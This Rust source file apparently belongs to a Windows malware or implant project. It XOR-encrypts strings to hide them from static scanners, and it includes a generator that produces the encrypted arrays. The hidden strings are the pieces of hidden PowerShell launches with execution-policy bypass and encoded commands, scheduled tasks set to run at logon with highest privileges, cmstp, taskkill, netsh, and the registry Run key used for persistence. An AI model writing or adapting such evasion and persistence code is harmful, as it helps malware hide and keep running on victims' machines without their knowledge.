#![allow(dead_code)]

const XOR_KEY: &[u8] = b"K0r1n!uM_2o24_S3cR3t_K3y!@#$";

#[inline(always)]
pub fn xor_decrypt(encrypted: &[u8]) -> String {
    encrypted
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .map(|b| b as char)
        .collect()
}

macro_rules! encrypted {
    ($($byte:expr),* $(,)?) => {
        &[$($byte),*]
    };
}

pub mod exe {
    use super::*;

    // cmd.exe
    pub fn cmd() -> String {
        xor_decrypt(encrypted![0x28, 0x5d, 0x16, 0x1f, 0x0b, 0x59, 0x10])
    }

    // powershell.exe
    pub fn powershell() -> String {
        xor_decrypt(encrypted![0x3b, 0x5f, 0x05, 0x54, 0x1c, 0x52, 0x1d, 0x28, 0x33, 0x5e, 0x41, 0x57, 0x4c, 0x3a])
    }

    // schtasks.exe
    pub fn schtasks() -> String {
        xor_decrypt(encrypted![0x38, 0x53, 0x1a, 0x45, 0x0f, 0x52, 0x1e, 0x3e, 0x71, 0x57, 0x17, 0x57])
    }

    // cmstp.exe
    pub fn cmstp() -> String {
        xor_decrypt(encrypted![0x28, 0x5d, 0x01, 0x45, 0x1e, 0x0f, 0x10, 0x35, 0x3a])
    }

    // reg.exe
    pub fn reg() -> String {
        xor_decrypt(encrypted![0x39, 0x55, 0x15, 0x1f, 0x0b, 0x59, 0x10])
    }

    // taskkill.exe
    pub fn taskkill() -> String {
        xor_decrypt(encrypted![0x3f, 0x51, 0x01, 0x5a, 0x05, 0x48, 0x19, 0x21, 0x71, 0x57, 0x17, 0x57])
    }

    // netsh.exe
    pub fn netsh() -> String {
        xor_decrypt(encrypted![0x25, 0x55, 0x06, 0x42, 0x06, 0x0f, 0x10, 0x35, 0x3a])
    }
}

pub mod powershell {
    use super::*;

    // -File
    pub fn file() -> String {
        xor_decrypt(encrypted![0x66, 0x76, 0x1b, 0x5d, 0x0b])
    }

    // -NoProfile
    pub fn no_profile() -> String {
        xor_decrypt(encrypted![0x66, 0x7e, 0x1d, 0x61, 0x1c, 0x4e, 0x13, 0x24, 0x33, 0x57])
    }

    // -WindowStyle
    pub fn window_style() -> String {
        xor_decrypt(encrypted![0x66, 0x67, 0x1b, 0x5f, 0x0a, 0x4e, 0x02, 0x1e, 0x2b, 0x4b, 0x03, 0x57])
    }

    // Hidden
    pub fn hidden() -> String {
        xor_decrypt(encrypted![0x03, 0x59, 0x16, 0x55, 0x0b, 0x4f])
    }

    // -ExecutionPolicy
    pub fn execution_policy() -> String {
        xor_decrypt(encrypted![0x66, 0x75, 0x0a, 0x54, 0x0d, 0x54, 0x01, 0x24, 0x30, 0x5c, 0x3f, 0x5d, 0x58, 0x36, 0x30, 0x4a])
    }

    // Bypass
    pub fn bypass() -> String {
        xor_decrypt(encrypted![0x09, 0x49, 0x02, 0x50, 0x1d, 0x52])
    }

    // -Command
    pub fn command() -> String {
        xor_decrypt(encrypted![0x66, 0x73, 0x1d, 0x5c, 0x03, 0x40, 0x1b, 0x29])
    }

    // -NonInteractive
    pub fn non_interactive() -> String {
        xor_decrypt(encrypted![0x66, 0x7e, 0x1d, 0x5f, 0x27, 0x4f, 0x01, 0x28, 0x2d, 0x53, 0x0c, 0x46, 0x5d, 0x29, 0x36])
    }

    // -EncodedCommand
    pub fn encoded_command() -> String {
        xor_decrypt(encrypted![0x66, 0x75, 0x1c, 0x52, 0x01, 0x45, 0x10, 0x29, 0x1c, 0x5d, 0x02, 0x5f, 0x55, 0x31, 0x37])
    }
}

pub mod args {
    use super::*;

    // /f (force)
    pub fn force() -> String {
        xor_decrypt(encrypted![0x64, 0x56])
    }

    // /query
    pub fn query() -> String {
        xor_decrypt(encrypted![0x64, 0x41, 0x07, 0x54, 0x1c, 0x58])
    }

    // /tn
    pub fn task_name() -> String {
        xor_decrypt(encrypted![0x64, 0x44, 0x1c])
    }

    // /create
    pub fn create() -> String {
        xor_decrypt(encrypted![0x64, 0x53, 0x00, 0x54, 0x0f, 0x55, 0x10])
    }

    // /tr
    pub fn task_run() -> String {
        xor_decrypt(encrypted![0x64, 0x44, 0x00])
    }

    // /sc
    pub fn schedule() -> String {
        xor_decrypt(encrypted![0x64, 0x43, 0x11])
    }

    // onlogon
    pub fn onlogon() -> String {
        xor_decrypt(encrypted![0x24, 0x5e, 0x1e, 0x5e, 0x09, 0x4e, 0x1b])
    }

    // /rl
    pub fn run_level() -> String {
        xor_decrypt(encrypted![0x64, 0x42, 0x1e])
    }

    // highest
    pub fn highest() -> String {
        xor_decrypt(encrypted![0x23, 0x59, 0x15, 0x59, 0x0b, 0x52, 0x01])
    }

    // /delete
    pub fn delete() -> String {
        xor_decrypt(encrypted![0x64, 0x54, 0x17, 0x5d, 0x0b, 0x55, 0x10])
    }

    // /fo
    pub fn format_output() -> String {
        xor_decrypt(encrypted![0x64, 0x56, 0x1d])
    }

    // LIST
    pub fn list() -> String {
        xor_decrypt(encrypted![0x07, 0x79, 0x21, 0x65])
    }
}

pub mod registry {
    use super::*;

    // HKEY_CURRENT_USER
    pub fn hkcu() -> String {
        xor_decrypt(encrypted![0x03, 0x7b, 0x37, 0x68, 0x31, 0x62, 0x20, 0x1f, 0x0d, 0x77, 0x21, 0x66, 0x6b, 0x0a, 0x00, 0x76, 0x31])
    }

    // SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    pub fn run_key() -> String {
        xor_decrypt(encrypted![0x18, 0x7f, 0x34, 0x65, 0x39, 0x60, 0x27, 0x08,
            0x03, 0x7f, 0x06, 0x51, 0x46, 0x30, 0x20, 0x5c, 0x05, 0x26, 0x6f,
            0x23, 0x36, 0x25, 0x57, 0x16, 0x56, 0x33, 0x7f, 0x67, 0x3e, 0x42,
            0x00, 0x54, 0x00, 0x55, 0x23, 0x28, 0x2d, 0x41, 0x06, 0x5d, 0x5a,
            0x03, 0x01, 0x46, 0x0d
        ])
    }
}

#[cfg(debug_assertions)]
pub mod dev_tools {
    use super::XOR_KEY;

    pub fn encrypt_string(plaintext: &str) -> Vec<u8> {
        plaintext
            .bytes()
            .enumerate()
            .map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()])
            .collect()
    }

    pub fn encrypt_to_code(name: &str, plaintext: &str) {
        let encrypted = encrypt_string(plaintext);
        let bytes_str = encrypted
            .iter()
            .map(|b| format!("0x{:02x}", b))
            .collect::<Vec<_>>()
            .join(", ");
        
        println!("/// {}", plaintext);
        println!("pub fn {}() -> String {{", name);
        println!("    xor_decrypt(encrypted![{}])", bytes_str);
        println!("}}");
    }

    pub fn batch_encrypt(items: &[(&str, &str)]) {
        for (name, plaintext) in items {
            encrypt_to_code(name, plaintext);
            println!();
        }
    }
}
